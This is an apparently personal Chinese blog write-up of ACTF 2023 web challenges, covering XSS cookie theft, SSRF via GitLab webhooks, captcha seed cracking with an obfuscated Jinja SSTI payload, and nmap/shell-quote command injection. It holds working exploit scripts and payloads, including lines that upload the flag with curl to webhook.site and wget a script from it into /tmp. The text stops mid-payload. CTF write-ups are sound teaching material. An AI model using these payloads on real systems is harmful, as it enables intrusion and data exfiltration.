href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>这里是可以直接看phpinfo的  这里的话就可以看到一个有imagick这个插件  直接就p牛有一篇文章就是讲的这个</p><p>这个插件的话是可以写shell的  这里直接用上面师傅给的poc就行 </p><p><img src="../images/image-20231031195450270.png" alt="image-20231031195450270"></p><p><strong>(这道题的思路其实和之前比赛的哪道题很相似来着 就是有文件包含和文件写入)</strong></p><p>得写到tmp目录下  其他目录不可写</p><p>这里的话其实pearcmd也行  直接去包含这个pearcmd.php文件  发现有返回结果后  直接去用就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure><p>看完别人的wp发现  其实session临时文件上传也是可以做的</p><p><a href="https://su-team.cn/passages/2023-10-28-ACTF/">https://su-team.cn/passages/2023-10-28-ACTF/</a>  贴个链接  直接看就行了</p><h2 id="easy-latex"><a href="#easy-latex" class="headerlink" title="easy latex"></a>easy latex</h2><p>题目环境关了  没办法复现了…………..</p><p><img src="../images/image-20231031212656052.png" alt="image-20231031212656052"></p><p>其实关键点就在这个地方</p><p>这里的话传进来的theme参数可以覆盖掉后后面的URL</p><p><img src="../images/image-20231031212910445.png" alt="image-20231031212910445"></p><p>这就是关键点了  我们可以起一个服务  来测试/priview这个路由下会不会造成xss</p><p><img src="../images/image-20231031213108129.png" alt="image-20231031213108129"></p><p><img src="../images/image-20231031213130554.png" alt="image-20231031213130554"></p><p>发现是存在这种可能性的</p><p>然后我们再来看这个note和share路由</p><p><img src="../images/image-20231031213606521.png" alt="image-20231031213606521"></p><p><img src="../images/image-20231031213617498.png" alt="image-20231031213617498"></p><p>相较于这个note路由  share路由是没有进行校验的  所以我们可以用这个share路由来做</p><p>并且id我们是可控的  而且这个<code>req.params</code>是支持url解码的</p><p>然后进入到这个visit函数</p><p><img src="../images/image-20231031213916915.png" alt="image-20231031213916915"></p><p>我们是不能直接外带cookie的  因为设置了这个httpOnly</p><p><img src="../images/image-20231031214041569.png" alt="image-20231031214041569"></p><p>然后再看这个vip路由  他是回拿着cookie去访问一个网站  并且将响应包返回  这里就可以帮我们把cookie带出来了</p><p>所以思路就是</p><p>我们通过priview路由测试得知  username可控并且可以xss  那么我们就直接再login路由的时候设置好username（因为再看vip路由的时候 username是从session中取出来的  然后再让其访问vip路由将cookie发送出来就行了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/share/../preview?tex=awdadawd&amp;theme=//112.124.44.238:8000/a</span><br><span class="line"></span><br><span class="line">进行url全编码就行了</span><br></pre></td></tr></table></figure><p>恶意js代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;/login&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;,</span><br><span class="line">    redirect:&quot;follow&quot;,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        &#x27;Content-Type&#x27;: &quot;application/x-www-form-urlencoded&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    body:&quot;username=http://114.116.119.253:7777&amp;password=c2ceb7948ba609ad5f728c96cae769ba&quot;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(&#x27;first&#x27;);</span><br><span class="line">function exp()&#123;</span><br><span class="line">fetch(&#x27;/vip&#x27;,&#123;</span><br><span class="line">    method:&quot;POST&quot;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>然后这样就结束了</p><p> 其他wp也有其他方式的js文件  自己去查来看看就行了</p><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>环境也关了………………</p><p>这道题的话其实信息检索能力到位的话  是很容易就出的</p><p><a href="https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/">https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/</a></p><p><a href="https://www.youtube.com/watch?v=wrRha2vwv6Q">https://www.youtube.com/watch?v=wrRha2vwv6Q</a></p><p>特别是这个youtube视频  如果当时查到的话必出  </p><p>webhooks这个东西的话github和gitlab是各有一个  只不过GitHub的是只能post发包  gitlab的话是可以get发包</p><p><img src="../images/image-20231031220135615.png" alt="image-20231031220135615"></p><p>就是这个玩意</p><p><img src="../images/image-20231031220915012.png" alt="image-20231031220915012"></p><p>gitlab里面也是有一个webhooks</p><p>就是现在服务器上搭建一个flask服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, redirect, request</span><br><span class="line">from urllib.parse import unquote</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.post(&#x27;/redirect&#x27;)</span><br><span class="line">def perform_redirect():</span><br><span class="line">    redirect_url = request.args.get(&#x27;redirect_url&#x27;)</span><br><span class="line">    if redirect_url:</span><br><span class="line">        return redirect(redirect_url, code=302)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Missing &#x27;redirect_url&#x27; parameter&quot;, 400</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, port =1234, debug=True)</span><br></pre></td></tr></table></figure><p>然后再使用gitlab的webhooks发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址</span><br></pre></td></tr></table></figure><p>然后就会返回告诉你</p><p><img src="../images/image-20231031222011605.png" alt="image-20231031222011605"></p><p>这次的话就可以直接贴内网地址了 <code>http://jenkins:8080/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.42.39.110:1234/redirect?redirect_url=题目地址&amp;redirect_url=http://jenkins:8080/</span><br></pre></td></tr></table></figure><p>然后就会返回jenkins的版本号  然后我们直接去找poc打就出了</p><p>CVE-2019-100030洞是这个  接下去找这个poc来打就ok了</p><h2 id="Story"><a href="#Story" class="headerlink" title="Story"></a>Story</h2><p>这个题考的就是之前p牛发的文章里的那个<code>jumpserver</code>随机数预测</p><p>漏洞点就在这个key处</p><p><img src="../images/image-20231031222936757.png" alt="image-20231031222936757"></p><p><code>random.randint(1,100)</code>这个代码的话是生成1-100之间的随机数  并且这个time.time()的话是生成时间戳  </p><p>key的话是时间戳加上随机数  这样是可以爆破出来的</p><p><img src="../images/image-20231031223548962.png" alt="image-20231031223548962"></p><p>访问一次captcha的话就会返回code  并且种子是全局播种的</p><p>那么我们就可以去看看其code是怎么生成的</p><p><img src="../images/image-20231031223640032.png" alt="image-20231031223640032"></p><p><img src="../images/image-20231031223648359.png" alt="image-20231031223648359"></p><p>就是随机生成四位随机数</p><p>爆破seed脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br></pre></td></tr></table></figure><p>然后在获取到seed后  如何使必须得成为vip才能进行story参数的传参</p><p><img src="../images/image-20231101103601451.png" alt="image-20231101103601451"></p><p><img src="../images/image-20231101102802056.png" alt="image-20231101102802056"></p><p>这里是第二获取到这个code  因为外面已经获取到了这个seed  那么这个code我们在本地就可以运行得出</p><p>然后传上去就能获取到vip了</p><p>在成为vip之后  我们就可以进行story的传参</p><p><img src="../images/image-20231101103650543.png" alt="image-20231101103650543"></p><p><img src="../images/image-20231101103726674.png" alt="image-20231101103726674"></p><p>这个对参数的过滤很有意思   是在6条规则中随机挑选3条  那么就存在三条一样的情况  那么我们就直接在本地进行测试  看看第几次的时候才能存在三条规则一样的情况  <strong>(这里选的是第一条)</strong></p><p>然后我们在写脚本循环访问x-1次  然后最后一次的时候再用payload去打就行了</p><p><img src="../images/image-20231101103843923.png" alt="image-20231101103843923"></p><p>ssti的payload  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><strong>testminic  (用来判断什么时候存在三条一样的rule1)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line"></span><br><span class="line">rule = [</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># Make waf more random</span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    result_2 = None</span><br><span class="line">    result_1 = None</span><br><span class="line">    result_3 = None</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        if index == 0:</span><br><span class="line">            result_1 = rule[waf_seq[index]]</span><br><span class="line">        elif index == 1:</span><br><span class="line">            result_2 = rule[waf_seq[index]]</span><br><span class="line">        else:</span><br><span class="line">            result_3 = rule[waf_seq[index]]</span><br><span class="line">        if(result_1==result_2 ==result_3==[&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;]):</span><br><span class="line">            print(result_3)</span><br><span class="line">            return &#x27;1&#x27;</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">from utils.captcha import Captcha</span><br><span class="line">from utils.testminic import *</span><br><span class="line"></span><br><span class="line">def generate_code(length: int = 4,z=0):</span><br><span class="line">    characters = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(characters) for _ in range(length))</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.70.33.170:23001/&#x27;</span><br><span class="line">url = &#x27;http://127.0.0.1:5000/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br><span class="line">            gen = Captcha(200, 80,seed)</span><br><span class="line">            buf , captcha_text = gen.generate()</span><br><span class="line">            code = generate_code()</span><br><span class="line">            minic_waf(payload)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            x = 0</span><br><span class="line">            while True:</span><br><span class="line">                x+=1</span><br><span class="line">                if minic_waf(payload) == &#x27;1&#x27;:</span><br><span class="line">                    print(x)</span><br><span class="line">                    break</span><br><span class="line">            if(x&gt;10):</span><br><span class="line">                print(&quot;more than 10&quot;)</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                break</span><br><span class="line">            print(&quot;x_all:&quot;+str(x))</span><br><span class="line">            res = session.post(url+&#x27;vip&#x27;,json=&#123;&quot;captcha&quot;:code&#125;)</span><br><span class="line">            print(res.cookies)</span><br><span class="line">            print(&quot;a&quot;)</span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            error = []</span><br><span class="line">            for i in range(x-1):</span><br><span class="line">                res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line"></span><br><span class="line">                print(i)</span><br><span class="line">            payload = &#x27;&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x27;</span><br><span class="line">            </span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            res = session.get(url+&#x27;story&#x27;)</span><br><span class="line">            print(&quot;result:&quot;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">            if(&#x27;ACTF&#x27; in res.text):</span><br><span class="line">                exit(0)</span><br><span class="line">            </span><br></pre></td></tr></table></figure><h2 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h2><p>这题其实是参考sekaictf的一道题 </p><p><a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution</a></p><p>非预期就是靶机有问题  别人解出的flag直接就是会在日志里  然后大家都能看到了</p><p>预期解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正解</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/plzfailme</span><br><span class="line"></span><br><span class="line">另一种解法：</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????%09-oN%09public/114.html</span><br><span class="line">http://192.168.247.18:3333/114.html</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231101105029814.png" alt="image-20231101105029814"></p><h2 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="~Ave Mujica’s Masquerade~"></a>~Ave Mujica’s Masquerade~</h2><p>这题的话是上面那题的升级版</p><p>只不过是另一个考点</p><p><img src="../images/image-20231101105439024.png" alt="image-20231101105439024"></p><p>其实重点就是绕过他  <img src="../images/image-20231101105542128.png" alt="image-20231101105542128"></p><p>是存在一个洞的这个版本</p><p><a href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a>  这篇文章看懂就出</p><p>payload1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">curl -T /flag-???????????????? http://webhook.site/&lt;id&gt;/</span><br><span class="line"></span><br><span class="line">网站执行</span><br><span class="line">http://&lt;url&gt;/checker?url=127.0.0.1:`:`wget$IFS\webhook.site/&lt;id&gt;/$IFS\-O$IFS/tmp/s.sh``:`</span><br><span class="line">http:/&lt;url/checker?url=127.0.0.1:`:`sh$IFS\/tmp/s.sh``:`</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`mkdir$IFS$1public``%3a%23</span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`find$IFS$1/$IFS$1-name$IFS$1flag-*$IFS$1-exec$IFS$1cp$IFS$1&#123;&#125;$IFS$1./public/6.png$IFS$1\;``%3a%23</span><br><span class="line">http://124.70.33.170:24001/6.png</span><br></pre></td></tr></table></figure><p>payload3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.33.170:24001/checker?url=1:`:`sleep$IFS\9``:` </span><br><span class="line"></span><br><span class="line">exp</span><br><span class="line">http://124.70.33.170:24001/checker?url=0%00%3A%60%3A%60python3%24IFS%5C-c%24IFS%5Cexec%28chr%28105%29%2Bchr%28109%29%2Bchr%28112%29%2Bchr%28111%29%2Bchr%28114%29%2Bchr%28116%29%2Bchr%2832%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2861%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2846%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2840%29%2Bchr%2839%29%2Bchr%2847%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2842%29%2Bchr%2839%29%2Bchr%2841%29%2Bchr%2891%29%2Bchr%2848%29%2Bchr%2893%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%2834%29%2Bchr%28112%29%2Bchr%28117%29%2Bchr%2898%29%2Bchr%28108%29%2Bchr%28105%29%2Bchr%2899%29%2Bchr%2847%29%2Bchr%2849%29%2Bchr%2849%29%2Bchr%2852%29%2Bchr%2846%29%2Bchr%28104%29%2Bchr%28116%29%2Bchr%28109%29%2Bchr%28108%29%2B